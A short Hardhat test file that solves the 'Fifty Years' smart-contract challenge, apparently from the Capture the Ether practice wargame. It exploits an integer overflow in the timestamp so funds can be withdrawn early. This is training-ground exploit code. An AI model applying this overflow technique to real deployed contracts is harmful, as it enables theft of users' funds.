import { expect } from "chai";
import { ethers } from "hardhat";

describe("FiftyYearsChallenge", function () {
  before(async () => {
    this.ctx.player = (await ethers.getSigners())[0];
    this.ctx.challengeContract = await ethers.getContractAt(
      "FiftyYearsChallenge",
      "0xe53c4CA2BBa9FA1511B6fb4df03c81Cd5d11d30A"
    );
  });
  it("exploit", async function () {
    await this.challengeContract.upsert(
      1,
      ethers.constants.MaxUint256.sub(86399),
      {
        value: 1,
      }
    );
    await this.challengeContract.upsert(2, 0, {
      value: 1,
    });
    await this.challengeContract.withdraw(1);
  });

  after(async () => {
    expect(await this.ctx.challengeContract.isComplete()).to.be.true;
  });
});
